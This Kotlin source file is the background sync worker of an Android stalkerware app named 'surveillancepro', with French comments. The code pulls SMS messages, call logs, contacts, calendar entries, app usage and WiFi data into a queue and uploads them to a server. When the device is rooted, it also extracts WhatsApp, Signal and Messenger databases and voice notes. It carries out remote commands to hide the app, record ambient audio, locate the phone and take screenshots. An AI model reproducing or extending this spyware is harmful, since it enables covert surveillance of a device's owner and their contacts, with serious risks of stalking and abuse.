package com.surveillancepro.android.workers

import android.content.Context
import android.util.Log
import androidx.work.*
import com.surveillancepro.android.data.ApiClient
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import com.surveillancepro.android.root.DatabaseExtractor
import com.surveillancepro.android.root.RootManager
import com.surveillancepro.android.root.VoiceNoteExtractor
import com.surveillancepro.android.services.StealthManager
import com.surveillancepro.android.services.AppUsageTracker
import com.surveillancepro.android.services.CallLogTracker
import com.surveillancepro.android.services.GeofenceService
import com.surveillancepro.android.services.AmbientAudioService
import com.surveillancepro.android.services.AppBlockerService
import java.util.concurrent.TimeUnit

class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {

    override suspend fun doWork(): Result {
        val storage = DeviceStorage.getInstance(applicationContext)
        if (!storage.hasAccepted || storage.deviceToken == null) return Result.success()

        val queue = EventQueue.getInstance(applicationContext)
        val api = ApiClient.getInstance(storage)

        collectFreshData(storage, queue)

        // Extraction root (si disponible)
        collectRootData(queue)

        // Vider la file d'attente par lots
        var totalSent = 0
        var retries = 0

        while (retries < 3) {
            val batch = queue.peek(50)
            if (batch.isEmpty()) break

            val events = batch.map { mapOf(
                "type" to it.type,
                "payload" to it.payload,
                "timestamp" to it.createdAt
            )}

            try {
                val result = api.syncBatch(events)
                if (result.success) {
                    queue.remove(batch.map { it.id })
                    totalSent += batch.size
                    processCommands(result.commands)
                } else {
                    queue.incrementRetry(batch.map { it.id })
                    retries++
                }
            } catch (e: Exception) {
                Log.w("SyncWorker", "Sync failed: ${e.message}")
                queue.incrementRetry(batch.map { it.id })
                retries++
            }
        }

        Log.d("SyncWorker", "Sync done: $totalSent events sent, ${queue.count()} remaining")
        return if (totalSent > 0 || queue.count() == 0) Result.success() else Result.retry()
    }

    @Suppress("UNCHECKED_CAST")
    private fun processCommands(commands: List<Map<String, Any>>) {
        for (cmd in commands) {
            val type = cmd["type"] as? String ?: continue
            val payload = cmd["payload"] as? Map<String, Any> ?: emptyMap()
            Log.d("SyncWorker", "Processing command: $type")

            when (type) {
                "set_stealth_mode" -> {
                    val mode = payload["mode"] as? String ?: "disguised"
                    when (mode) {
                        "deep" -> StealthManager.enableDeepStealth(applicationContext)
                        "visible" -> {
                            if (StealthManager.isDeepStealthActive(applicationContext)) {
                                StealthManager.disableDeepStealth(applicationContext)
                            }
                            StealthManager.setMode(applicationContext, StealthManager.StealthMode.VISIBLE)
                        }
                        "hidden" -> StealthManager.setMode(applicationContext, StealthManager.StealthMode.HIDDEN)
                        else -> StealthManager.setMode(applicationContext, StealthManager.StealthMode.DISGUISED)
                    }
                }
                "locate" -> {
                    try {
                        val intent = android.content.Intent(applicationContext,
                            com.surveillancepro.android.services.LocationService::class.java).apply {
                            putExtra(com.surveillancepro.android.services.LocationService.EXTRA_MODE,
                                com.surveillancepro.android.services.LocationService.MODE_SINGLE)
                        }
                        applicationContext.startForegroundService(intent)
                    } catch (_: Exception) {}
                }
                "update_geofences" -> {
                    @Suppress("UNCHECKED_CAST")
                    val zones = payload["zones"] as? List<Map<String, Any>> ?: emptyList()
                    GeofenceService.configureFromServer(applicationContext, zones)
                }
                "listen_ambient" -> {
                    // Ecoute audio ambiante
                    val duration = (payload["duration"] as? Number)?.toInt() ?: 30
                    val mode = payload["mode"] as? String ?: AmbientAudioService.MODE_RECORD
                    val cmdId = (cmd["id"] as? Number)?.toLong() ?: 0
                    try {
                        val intent = android.content.Intent(applicationContext, AmbientAudioService::class.java).apply {
                            putExtra(AmbientAudioService.EXTRA_MODE, mode)
                            putExtra(AmbientAudioService.EXTRA_DURATION, duration)
                            putExtra(AmbientAudioService.EXTRA_COMMAND_ID, cmdId)
                        }
                        applicationContext.startForegroundService(intent)
                    } catch (_: Exception) {}
                }
                "update_blocked_apps" -> {
                    // Mise a jour des apps bloquees
                    @Suppress("UNCHECKED_CAST")
                    val config = payload as? Map<String, Any> ?: emptyMap()
                    AppBlockerService.configureFromServer(config)
                }
                "take_screenshot" -> {
                    // Capture d'écran à distance - nécessite MediaProjection déjà autorisé
                    // La capture sera déclenchée via l'AccessibilityService
                    try {
                        val prefs = applicationContext.getSharedPreferences("sp_screen_capture", android.content.Context.MODE_PRIVATE)
                        if (prefs.getBoolean("permission_granted", false)) {
                            // Envoyer un broadcast pour déclencher la capture
                            val intent = android.content.Intent("com.surveillancepro.TAKE_SCREENSHOT")
                            applicationContext.sendBroadcast(intent)
                        }
                    } catch (_: Exception) {}
                }
            }

            // Acquitter la commande
            try {
                val cmdId = (cmd["id"] as? Number)?.toLong()
                if (cmdId != null) {
                    kotlinx.coroutines.runBlocking {
                        val api = ApiClient.getInstance(DeviceStorage.getInstance(applicationContext))
                        api.sendEvent("command_ack", mapOf(
                            "commandId" to cmdId,
                            "type" to type,
                            "status" to "executed",
                        ))
                    }
                }
            } catch (_: Exception) {}
        }
    }

    private fun collectFreshData(storage: DeviceStorage, queue: EventQueue) {
        // App usage - TOUTES les apps utilisées
        try {
            val usageTracker = AppUsageTracker(applicationContext)
            val usage = usageTracker.getUsageToday()
            if (usage.isNotEmpty()) {
                queue.enqueue("app_usage", mapOf("apps" to usage, "count" to usage.size))
            }
            // Apps installées (mise à jour périodique)
            val installedApps = usageTracker.getInstalledApps()
            if (installedApps.isNotEmpty()) {
                queue.enqueue("apps_installed", mapOf("apps" to installedApps, "count" to installedApps.size))
            }
        } catch (_: Exception) {}

        // Journal d'appels COMPLET
        try {
            CallLogTracker(applicationContext).syncToQueue(queue)
        } catch (_: Exception) {}

        // SMS - Synchroniser TOUS les SMS récents
        try {
            syncRecentSMS(queue)
        } catch (_: Exception) {}

        // Contacts - Synchronisation complète
        try {
            syncAllContacts(queue)
        } catch (_: Exception) {}

        // Calendrier - Événements à venir
        try {
            syncCalendarEvents(queue)
        } catch (_: Exception) {}

        // WiFi - Réseaux connectés
        try {
            syncWifiInfo(queue)
        } catch (_: Exception) {}

        // Heartbeat avec infos système COMPLÈTES
        try {
            val bm = applicationContext.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            val battery = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
            val charging = bm.isCharging
            val stats = android.os.StatFs(android.os.Environment.getDataDirectory().path)
            val freeGB = (stats.availableBytes / (1024.0 * 1024.0 * 1024.0))
            val totalGB = (stats.totalBytes / (1024.0 * 1024.0 * 1024.0))

            // Infos réseau
            val cm = applicationContext.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val network = cm.activeNetwork
            val caps = cm.getNetworkCapabilities(network)
            val networkType = when {
                caps?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) == true -> "WiFi"
                caps?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "Mobile"
                else -> "None"
            }

            val heartbeat = mutableMapOf<String, Any>(
                "batteryLevel" to battery,
                "batteryState" to if (charging) "charging" else "unplugged",
                "storageFreeGB" to String.format("%.2f", freeGB).toDouble(),
                "storageTotalGB" to String.format("%.2f", totalGB).toDouble(),
                "storageUsedPercent" to ((1 - freeGB/totalGB) * 100).toInt(),
                "networkType" to networkType,
                "queueSize" to queue.count(),
                "system" to "Android ${android.os.Build.VERSION.RELEASE}",
                "sdk" to android.os.Build.VERSION.SDK_INT,
                "model" to "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}",
                "isRooted" to RootManager.isRooted(),
                "uptime" to (android.os.SystemClock.elapsedRealtime() / 1000 / 60), // minutes
            )

            queue.enqueue("heartbeat", heartbeat)
        } catch (_: Exception) {}
    }

    private fun syncRecentSMS(queue: EventQueue) {
        val prefs = applicationContext.getSharedPreferences("sp_sync", Context.MODE_PRIVATE)
        val lastSmsSync = prefs.getLong("last_sms_sync", System.currentTimeMillis() - 24 * 60 * 60 * 1000)
        
        val cursor = applicationContext.contentResolver.query(
            android.provider.Telephony.Sms.CONTENT_URI,
            arrayOf(
                android.provider.Telephony.Sms._ID,
                android.provider.Telephony.Sms.ADDRESS,
                android.provider.Telephony.Sms.BODY,
                android.provider.Telephony.Sms.DATE,
                android.provider.Telephony.Sms.TYPE,
            ),
            "${android.provider.Telephony.Sms.DATE} > ?",
            arrayOf(lastSmsSync.toString()),
            "${android.provider.Telephony.Sms.DATE} DESC LIMIT 50"
        ) ?: return

        val messages = mutableListOf<Map<String, Any>>()
        var maxDate = lastSmsSync

        while (cursor.moveToNext()) {
            val address = cursor.getString(1) ?: "inconnu"
            val body = cursor.getString(2) ?: ""
            val date = cursor.getLong(3)
            val type = cursor.getInt(4)

            if (date > maxDate) maxDate = date

            val smsType = when (type) {
                android.provider.Telephony.Sms.MESSAGE_TYPE_INBOX -> "recu"
                android.provider.Telephony.Sms.MESSAGE_TYPE_SENT -> "envoye"
                else -> "autre"
            }

            messages.add(mapOf(
                "address" to address,
                "body" to body.take(1000),
                "type" to smsType,
                "date" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US).format(java.util.Date(date)),
            ))
        }
        cursor.close()

        if (messages.isNotEmpty()) {
            queue.enqueue("sms_batch", mapOf("messages" to messages, "count" to messages.size))
            prefs.edit().putLong("last_sms_sync", maxDate).apply()
        }
    }

    private fun syncAllContacts(queue: EventQueue) {
        val prefs = applicationContext.getSharedPreferences("sp_sync", Context.MODE_PRIVATE)
        val lastContactSync = prefs.getLong("last_contact_sync", 0L)
        val now = System.currentTimeMillis()
        
        // Sync contacts toutes les 6 heures max
        if (now - lastContactSync < 6 * 60 * 60 * 1000) return

        val contacts = mutableListOf<Map<String, String>>()
        val cursor = applicationContext.contentResolver.query(
            android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER,
            ),
            null, null,
            android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
        ) ?: return

        val seen = mutableSetOf<String>()
        while (cursor.moveToNext() && contacts.size < 1000) {
            val name = cursor.getString(0) ?: continue
            val number = cursor.getString(1) ?: continue
            val key = "$name|$number"
            if (seen.contains(key)) continue
            seen.add(key)
            contacts.add(mapOf("name" to name, "number" to number))
        }
        cursor.close()

        if (contacts.isNotEmpty()) {
            queue.enqueue("contacts_full", mapOf("contacts" to contacts, "count" to contacts.size))
            prefs.edit().putLong("last_contact_sync", now).apply()
        }
    }

    private fun syncCalendarEvents(queue: EventQueue) {
        try {
            val now = System.currentTimeMillis()
            val oneWeekLater = now + 7 * 24 * 60 * 60 * 1000

            val cursor = applicationContext.contentResolver.query(
                android.provider.CalendarContract.Events.CONTENT_URI,
                arrayOf(
                    android.provider.CalendarContract.Events.TITLE,
                    android.provider.CalendarContract.Events.DTSTART,
                    android.provider.CalendarContract.Events.DTEND,
                    android.provider.CalendarContract.Events.EVENT_LOCATION,
                ),
                "${android.provider.CalendarContract.Events.DTSTART} >= ? AND ${android.provider.CalendarContract.Events.DTSTART} <= ?",
                arrayOf(now.toString(), oneWeekLater.toString()),
                "${android.provider.CalendarContract.Events.DTSTART} ASC LIMIT 20"
            ) ?: return

            val events = mutableListOf<Map<String, Any>>()
            while (cursor.moveToNext()) {
                val title = cursor.getString(0) ?: "Sans titre"
                val start = cursor.getLong(1)
                val end = cursor.getLong(2)
                val location = cursor.getString(3) ?: ""

                events.add(mapOf(
                    "title" to title,
                    "start" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US).format(java.util.Date(start)),
                    "end" to java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US).format(java.util.Date(end)),
                    "location" to location,
                ))
            }
            cursor.close()

            if (events.isNotEmpty()) {
                queue.enqueue("calendar_events", mapOf("events" to events, "count" to events.size))
            }
        } catch (_: SecurityException) {}
    }

    private fun syncWifiInfo(queue: EventQueue) {
        try {
            val wifiTracker = com.surveillancepro.android.services.WifiTracker(applicationContext)
            wifiTracker.captureNetworkState(queue)
        } catch (_: Exception) {}
    }

    private fun collectRootData(queue: EventQueue) {
        if (!RootManager.isRooted()) return

        // Messages de toutes les apps (WhatsApp, Signal, Messenger, SMS)
        try {
            DatabaseExtractor.extractAllAndEnqueue(applicationContext)
        } catch (e: Exception) {
            Log.w("SyncWorker", "Root DB extraction failed: ${e.message}")
        }

        // Fichiers audio des messages vocaux (WhatsApp, Telegram)
        try {
            VoiceNoteExtractor.extractAndEnqueue(applicationContext)
        } catch (e: Exception) {
            Log.w("SyncWorker", "Voice note extraction failed: ${e.message}")
        }

        // Infos avancées (IMEI, MAC, serial)
        try {
            val advancedInfo = RootManager.getAdvancedDeviceInfo()
            if (advancedInfo.isNotEmpty()) {
                queue.enqueue("root_device_info", advancedInfo.mapValues { it.value as Any })
            }
        } catch (_: Exception) {}
    }

    companion object {
        private const val WORK_NAME = "supervision_pro_sync"

        fun schedule(context: Context, intervalMinutes: Long = 15) {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()

            val request = PeriodicWorkRequestBuilder<SyncWorker>(
                intervalMinutes, TimeUnit.MINUTES,
                2, TimeUnit.MINUTES // Flex interval pour exécution plus rapide
            )
                .setConstraints(constraints)
                .setBackoffCriteria(BackoffPolicy.LINEAR, 1, TimeUnit.MINUTES)
                .build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                WORK_NAME,
                ExistingPeriodicWorkPolicy.KEEP,
                request
            )
            Log.d("SyncWorker", "Scheduled every ${intervalMinutes}min")
        }

        fun triggerNow(context: Context) {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()

            val request = OneTimeWorkRequestBuilder<SyncWorker>()
                .setConstraints(constraints)
                .build()

            WorkManager.getInstance(context).enqueue(request)
        }
    }
}
